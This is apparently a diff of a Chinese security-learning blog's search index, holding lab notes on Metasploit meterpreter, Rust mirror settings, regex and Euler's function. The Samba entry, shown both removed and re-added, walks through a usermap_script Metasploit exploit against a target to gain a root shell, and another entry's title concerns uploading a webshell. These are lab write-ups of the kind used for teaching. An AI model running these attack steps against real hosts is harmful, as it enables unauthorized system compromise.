+<p><code>pwd</code> 查看当前路径</p>
+<p><code>screentshot</code>截图</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
+<p><code>background</code>会话转入后台</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
+<p>新建终端，进入/root目录下，查看截图</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
+<p>实验结束</p>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -786,6 +786,24 @@
       <tags>
         <tag>python</tag>
         <tag>pip</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>rust修改默认环境变量与源</title>
+    <url>/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="rust修改默认环境变量与源"><a href="#rust修改默认环境变量与源" class="headerlink" title="rust修改默认环境变量与源"></a>rust修改默认环境变量与源</h2><h3 id="0x00-windows-rust"><a href="#0x00-windows-rust" class="headerlink" title="0x00 windows rust"></a>0x00 windows rust</h3><p>当使用windows安装rust时，默认安装位置是C:\User\xxx\.cargo和C:\User\xxx\.rustup</p>
+<p>可以将目录粘贴到指定的文件夹位置，然后配置参数即可</p>
+<p>打开 <em><strong>cmd</strong></em> 配置参数</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setx CARGO_HOME &quot;D:\Program Files\.cargo&quot;</span><br><span class="line">setx RUSTUP_HOME &quot;D:\Program Files\.rustup&quot;</span><br><span class="line">setx RUSTUP_UPDATE_ROOT http://mirrors.ustc.edu.cn/rust-static/rustup</span><br><span class="line">setx RUSTUP_DIST_SERVER http://mirrors.ustc.edu.cn/rust-static</span><br></pre></td></tr></table></figure>
+
+<p>path 添加%CARGO_HOME%\bin</p>
+<h3 id="0x01-Linux-rust-换源"><a href="#0x01-Linux-rust-换源" class="headerlink" title="0x01 Linux rust 换源"></a>0x01 Linux rust 换源</h3><p>在~/.cargo目录下新建config文件，然后输入以下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &#x27;ustc&#x27;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>rust</tag>
+        <tag>环境变量</tag>
       </tags>
   </entry>
   <entry>
@@ -948,42 +966,6 @@
       </tags>
   </entry>
   <entry>
-    <title>rust修改默认环境变量与源</title>
-    <url>/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/</url>
-    <content><![CDATA[<h2 id="rust修改默认环境变量与源"><a href="#rust修改默认环境变量与源" class="headerlink" title="rust修改默认环境变量与源"></a>rust修改默认环境变量与源</h2><h3 id="0x00-windows-rust"><a href="#0x00-windows-rust" class="headerlink" title="0x00 windows rust"></a>0x00 windows rust</h3><p>当使用windows安装rust时，默认安装位置是C:\User\xxx\.cargo和C:\User\xxx\.rustup</p>
-<p>可以将目录粘贴到指定的文件夹位置，然后配置参数即可</p>
-<p>打开 <em><strong>cmd</strong></em> 配置参数</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setx CARGO_HOME &quot;D:\Program Files\.cargo&quot;</span><br><span class="line">setx RUSTUP_HOME &quot;D:\Program Files\.rustup&quot;</span><br><span class="line">setx RUSTUP_UPDATE_ROOT http://mirrors.ustc.edu.cn/rust-static/rustup</span><br><span class="line">setx RUSTUP_DIST_SERVER http://mirrors.ustc.edu.cn/rust-static</span><br></pre></td></tr></table></figure>
-
-<p>path 添加%CARGO_HOME%\bin</p>
-<h3 id="0x01-Linux-rust-换源"><a href="#0x01-Linux-rust-换源" class="headerlink" title="0x01 Linux rust 换源"></a>0x01 Linux rust 换源</h3><p>在~/.cargo目录下新建config文件，然后输入以下内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &#x27;ustc&#x27;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>rust</tag>
-        <tag>环境变量</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>samba提权</title>
-    <url>/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
-<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
-<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
-<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
-<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
-<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
-<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
-<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
-<p>实验完成</p>
-]]></content>
-      <tags>
-        <tag>samba</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/2021/12/28/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="sql-注入"><a href="#sql-注入" class="headerlink" title="sql 注入"></a>sql 注入</h2><h3 id="一般过程"><a href="#一般过程" class="headerlink" title="一般过程"></a>一般过程</h3><ol>
@@ -1133,6 +1115,24 @@
       <tags>
         <tag>sql</tag>
         <tag>注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>samba提权</title>
+    <url>/2021/12/20/samba%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h2 id="samba提权"><a href="#samba提权" class="headerlink" title="samba提权"></a>samba提权</h2><h3 id="利用samba漏洞，获得目标主机root权限"><a href="#利用samba漏洞，获得目标主机root权限" class="headerlink" title="利用samba漏洞，获得目标主机root权限"></a>利用samba漏洞，获得目标主机root权限</h3><h4 id="原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"><a href="#原理-Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了-bin-sh。如果在调用smb-conf中定义的外部脚本时，通过对-bin-sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。" class="headerlink" title="原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。"></a>原理:Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。</h4><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>确定目标存在<code>445</code>和<code>139</code>端口开放，使用msf，输入命令<code>search samba</code></p>
+<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220184011444.png" alt="image-20211220184011444"></p>
+<p>使用命令<code>use exploit/multi/samba/usermap_script</code>，启用漏洞利用模块，终端输入<code>info</code>，查看相关信息</p>
+<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220184341512.png" alt="image-20211220184341512"></p>
+<p>输入<code>set RHOST ip</code>,设置目标ip地址，输入<code>exploit</code>，开始攻击，攻击成功后，建立会话</p>
+<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220190130652.png" alt="image-20211220190130652"></p>
+<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
+<p><img src="http://121.5.125.62/image/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
+<p>实验完成</p>
+]]></content>
+      <tags>
+        <tag>samba</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1598,6 +1598,25 @@
       </tags>
   </entry>
   <entry>
+    <title>正则表达式</title>
+    <url>/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
+<p>[]表示里面的任何一个字符</p>
+<p>a{1，5}表示a有1到5之间个字符</p>
+<p>{0，}表示0个或者无穷个</p>
+<p>*表示{0，}</p>
+<p>+表示{1，}</p>
+<p>？表示{0，1}</p>
+<p>[^a,b,c]表示除了a,b,c的其他字符</p>
+<p>^是字符串开头</p>
+<p>$是字符串结尾</p>
+<p>（？&lt;=（a））表示以a开头</p>
+<p>（？=（a））表示以a结尾</p>
+<p>\d , \w  , \ s 匹配数字，字符，空格</p>
+<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
+]]></content>
+  </entry>
+  <entry>
     <title>绕过content_type检测文件类型上传webshell</title>
     <url>/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
@@ -1638,25 +1657,6 @@
         <tag>webshell</tag>
         <tag>content_type</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>正则表达式</title>
-    <url>/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
-<p>[]表示里面的任何一个字符</p>
-<p>a{1，5}表示a有1到5之间个字符</p>
-<p>{0，}表示0个或者无穷个</p>
-<p>*表示{0，}</p>
-<p>+表示{1，}</p>
-<p>？表示{0，1}</p>
-<p>[^a,b,c]表示除了a,b,c的其他字符</p>
-<p>^是字符串开头</p>
-<p>$是字符串结尾</p>
-<p>（？&lt;=（a））表示以a开头</p>
-<p>（？=（a））表示以a结尾</p>
-<p>\d , \w  , \ s 匹配数字，字符，空格</p>
-<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
-]]></content>
   </entry>
   <entry>
     <title>绕过前台脚本检测扩展名上传webshell</title>
@@ -1760,6 +1760,36 @@
       <tags>
         <tag>进程</tag>
         <tag>Messenger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>平方求解欧拉</title>
+    <url>/2022/12/26/%E5%B9%B3%E6%96%B9%E6%B1%82%E8%A7%A3%E6%AC%A7%E6%8B%89/</url>
+    <content><![CDATA[<p>最近遇到一个根据欧拉数求解原数的例子，即已知Euler(Q)的值，求解Q，另已知Q=q^2，且q为质数。</p>
+<h2 id="欧拉函数性质"><a href="#欧拉函数性质" class="headerlink" title="欧拉函数性质"></a>欧拉函数性质</h2><ol>
+<li>欧拉函数为积性函数。（对于数论函数 f(n) 不恒等于0，当 (m,n) = 1 时，满足 f(mn) = f(m)f(n) ，则称 f(n) 为积性函数） φ(mn) = φ(m)φ(n)，(m,n) = 1</li>
+<li>若 (m,n) = d，则φ(mn) = dφ(m)φ(n)/φ(d)</li>
+<li>若m、n满足m|n，则φ(mn) = mφ(n)</li>
+<li>若m、n满足m|n，则φ(m)|φ(n)</li>
+<li>对于质数p，其欧拉函数公式为φ(p) = p-1</li>
+<li>对于质数p，pk的欧拉函数公式为φ(pk) = (p-1) x p^（k-1）</li>
+<li>小于等于n且整除n的所有正整数的欧拉函数值之和等于n，即n = Σd|nφ(d)</li>
+<li>欧拉定理：若(a,m) = 1，则 aφ(m) ≡ 1 (mod m)。</li>
+<li>扩展欧拉定理</li>
+</ol>
+<ul>
+<li>ax ≡ ax mod φ(m) (mod m)，(a,m) = 1</li>
+<li>或ax ≡ ax  (mod m)，(a,m) ≠ 1且x &lt; φ(m)</li>
+<li>或 ax ≡ ax mod φ(m) + φ(m) (mod m)，(a,m) ≠ 1且x ≥ φ(m)</li>
+</ul>
+<p>根据6可知，当k=2时，Euler(q x q)=q x (q-1)；当已知Euler(Q)时，求解q就不难了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Euler(Q)+0.25=(q-0.5)^2;</span><br><span class="line">100Euler(Q)+25=(10q-5)^2;</span><br><span class="line">10q=sqrt(100Euler(Q)+25)+5</span><br><span class="line">q=(sqrt(100Euler(Q)+25)+5)/10</span><br></pre></td></tr></table></figure>
+<p>根据以上求解直接写出求解的python脚本(考虑精度问题，没有使用math.sqrt，直接使用二分法求解平方根)。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input Euler(q*q):&#x27;</span>))</span><br><span class="line">x=<span class="number">100</span>*x+<span class="number">25</span></span><br><span class="line">low, high, ans = <span class="number">0</span>, x, -<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> low &lt;= high:</span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid * mid &lt;= x:</span><br><span class="line">        ans = mid</span><br><span class="line">        low = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        high = mid - <span class="number">1</span></span><br><span class="line">ans+=<span class="number">5</span></span><br><span class="line">q=ans//<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q is &#x27;</span>,q)</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>欧拉函数</tag>
+        <tag>密码学</tag>
+        <tag>平方</tag>
       </tags>
   </entry>
 </search>
